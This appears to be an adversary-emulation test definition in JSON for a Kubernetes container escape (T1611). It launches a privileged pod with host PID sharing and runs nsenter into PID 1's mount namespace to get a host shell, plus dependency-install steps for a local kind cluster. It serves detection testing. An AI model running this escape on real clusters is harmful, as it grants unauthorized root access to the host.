{
  "id": "0b2f9520-a17a-4671-9dba-3bd034099fff",
  "name": "Deploy container using nsenter container escape",
  "description": "In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.\n\nAdditional Details:\n- https://twitter.com/mauilion/status/1129468485480751104\n- https://securekubernetes.com/scenario_2_attack/\n",
  "platforms": [
    "containers"
  ],
  "steps": [
    {
      "id": "e2e75f4e-1fd9-4137-bddd-1a6cb9dbb3ec",
      "type": "execute-command",
      "data": {
        "command": "kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{\"spec\":{\"hostPID\": true, \"containers\":[{\"name\":\"1\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"/bin/bash\"],\"stdin\": true,\"tty\":true,\"securityContext\":{\"privileged\":true}}]}}'\n",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "fb1087ce-db16-46f4-96a4-7b22252c9ef3",
      "type": "execute-command",
      "data": {
        "command": "kubectl --context kind-atomic-cluster delete pod atomic-escape-pod\n",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "dac90e83-fb6c-473c-ae6f-eedcf74283f9",
      "name": "Check dependency 1/5",
      "description": "Verify docker is installed.",
      "type": "execute-command",
      "data": {
        "command": "which docker\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "cae6847f-9bd9-43df-96b6-b1ef51365460",
      "name": "Resolve dependency 1/5",
      "description": "Verify docker is installed.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "76290c2c-cb63-43c1-a810-14ded25d6372",
      "name": "Re-check dependency 1/5",
      "description": "Verify docker is installed.",
      "type": "execute-command",
      "data": {
        "command": "which docker\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "062a63cc-5bb4-4ff4-b9da-a26b3abcf918",
      "name": "Check dependency 2/5",
      "description": "Verify docker service is running.",
      "type": "execute-command",
      "data": {
        "command": "sudo systemctl status docker\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "17818df5-903d-4154-8adc-f9b74e9ece4a",
      "name": "Resolve dependency 2/5",
      "description": "Verify docker service is running.",
      "type": "execute-command",
      "data": {
        "command": "sudo systemctl start docker\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "d2ea66ef-4c31-4364-8ca6-efb3971e78ca",
      "name": "Re-check dependency 2/5",
      "description": "Verify docker service is running.",
      "type": "execute-command",
      "data": {
        "command": "sudo systemctl status docker\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "526099f1-e6d0-4e23-8818-50bd543fd0ca",
      "name": "Check dependency 3/5",
      "description": "Verify kind is in the path.",
      "type": "execute-command",
      "data": {
        "command": "which kind\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "f34679d0-dc7d-4b50-8f62-dee16f996e9b",
      "name": "Resolve dependency 3/5",
      "description": "Verify kind is in the path.",
      "type": "execute-command",
      "data": {
        "command": "curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64\nchmod +x ./kind\nmv kind /usr/bin/kind\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "1ec95cf3-6610-47c4-9978-5928e913600b",
      "name": "Re-check dependency 3/5",
      "description": "Verify kind is in the path.",
      "type": "execute-command",
      "data": {
        "command": "which kind\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "c2a397fc-a7eb-40ff-ad4d-078c42e5e2d9",
      "name": "Check dependency 4/5",
      "description": "Verify kind-atomic-cluster is created",
      "type": "execute-command",
      "data": {
        "command": "sudo kind get clusters\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "719fc736-8267-4415-bef0-f7e6bba132c9",
      "name": "Resolve dependency 4/5",
      "description": "Verify kind-atomic-cluster is created",
      "type": "execute-command",
      "data": {
        "command": "sudo kind create cluster --name atomic-cluster\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "d15a152c-87c8-4a65-9b75-57448609ed98",
      "name": "Re-check dependency 4/5",
      "description": "Verify kind-atomic-cluster is created",
      "type": "execute-command",
      "data": {
        "command": "sudo kind get clusters\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "df5ce80a-681a-416d-9131-5dc3a4dcf351",
      "name": "Check dependency 5/5",
      "description": "Verify kubectl is in path",
      "type": "execute-command",
      "data": {
        "command": "which kubectl\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "720c40c9-664e-4999-8736-7544ea4f5ca3",
      "name": "Resolve dependency 5/5",
      "description": "Verify kubectl is in path",
      "type": "execute-command",
      "data": {
        "command": "curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\nchmod +x ./kubectl\nmv kubectl /usr/bin/kubectl\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "20e731ef-97c4-44c9-beee-466011d1a043",
      "name": "Re-check dependency 5/5",
      "description": "Verify kubectl is in path",
      "type": "execute-command",
      "data": {
        "command": "which kubectl\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "e2e75f4e-1fd9-4137-bddd-1a6cb9dbb3ec",
      "p": "on-success",
      "o": "fb1087ce-db16-46f4-96a4-7b22252c9ef3"
    },
    {
      "s": "e2e75f4e-1fd9-4137-bddd-1a6cb9dbb3ec",
      "p": "on-failure",
      "o": "fb1087ce-db16-46f4-96a4-7b22252c9ef3"
    },
    {
      "s": "dac90e83-fb6c-473c-ae6f-eedcf74283f9",
      "p": "on-success",
      "o": "e2e75f4e-1fd9-4137-bddd-1a6cb9dbb3ec"
    },
    {
      "s": "dac90e83-fb6c-473c-ae6f-eedcf74283f9",
      "p": "on-failure",
      "o": "cae6847f-9bd9-43df-96b6-b1ef51365460"
    },
    {
      "s": "cae6847f-9bd9-43df-96b6-b1ef51365460",
      "p": "on-success",
      "o": "76290c2c-cb63-43c1-a810-14ded25d6372"
    },
    {
      "s": "76290c2c-cb63-43c1-a810-14ded25d6372",
      "p": "on-failure",
      "o": "e2e75f4e-1fd9-4137-bddd-1a6cb9dbb3ec"
    },
    {
      "s": "062a63cc-5bb4-4ff4-b9da-a26b3abcf918",
      "p": "on-success",
      "o": "e2e75f4e-1fd9-4137-bddd-1a6cb9dbb3ec"
    },
    {
      "s": "062a63cc-5bb4-4ff4-b9da-a26b3abcf918",
      "p": "on-failure",
      "o": "17818df5-903d-4154-8adc-f9b74e9ece4a"
    },
    {
      "s": "17818df5-903d-4154-8adc-f9b74e9ece4a",
      "p": "on-success",
      "o": "d2ea66ef-4c31-4364-8ca6-efb3971e78ca"
    },
    {
      "s": "d2ea66ef-4c31-4364-8ca6-efb3971e78ca",
      "p": "on-failure",
      "o": "e2e75f4e-1fd9-4137-bddd-1a6cb9dbb3ec"
    },
    {
      "s": "526099f1-e6d0-4e23-8818-50bd543fd0ca",
      "p": "on-success",
      "o": "e2e75f4e-1fd9-4137-bddd-1a6cb9dbb3ec"
    },
    {
      "s": "526099f1-e6d0-4e23-8818-50bd543fd0ca",
      "p": "on-failure",
      "o": "f34679d0-dc7d-4b50-8f62-dee16f996e9b"
    },
    {
      "s": "f34679d0-dc7d-4b50-8f62-dee16f996e9b",
      "p": "on-success",
      "o": "1ec95cf3-6610-47c4-9978-5928e913600b"
    },
    {
      "s": "1ec95cf3-6610-47c4-9978-5928e913600b",
      "p": "on-failure",
      "o": "e2e75f4e-1fd9-4137-bddd-1a6cb9dbb3ec"
    },
    {
      "s": "c2a397fc-a7eb-40ff-ad4d-078c42e5e2d9",
      "p": "on-success",
      "o": "e2e75f4e-1fd9-4137-bddd-1a6cb9dbb3ec"
    },
    {
      "s": "c2a397fc-a7eb-40ff-ad4d-078c42e5e2d9",
      "p": "on-failure",
      "o": "719fc736-8267-4415-bef0-f7e6bba132c9"
    },
    {
      "s": "719fc736-8267-4415-bef0-f7e6bba132c9",
      "p": "on-success",
      "o": "d15a152c-87c8-4a65-9b75-57448609ed98"
    },
    {
      "s": "d15a152c-87c8-4a65-9b75-57448609ed98",
      "p": "on-failure",
      "o": "e2e75f4e-1fd9-4137-bddd-1a6cb9dbb3ec"
    },
    {
      "s": "df5ce80a-681a-416d-9131-5dc3a4dcf351",
      "p": "on-success",
      "o": "e2e75f4e-1fd9-4137-bddd-1a6cb9dbb3ec"
    },
    {
      "s": "df5ce80a-681a-416d-9131-5dc3a4dcf351",
      "p": "on-failure",
      "o": "720c40c9-664e-4999-8736-7544ea4f5ca3"
    },
    {
      "s": "720c40c9-664e-4999-8736-7544ea4f5ca3",
      "p": "on-success",
      "o": "20e731ef-97c4-44c9-beee-466011d1a043"
    },
    {
      "s": "20e731ef-97c4-44c9-beee-466011d1a043",
      "p": "on-failure",
      "o": "e2e75f4e-1fd9-4137-bddd-1a6cb9dbb3ec"
    }
  ],
  "tags": [
    "T1611"
  ]
}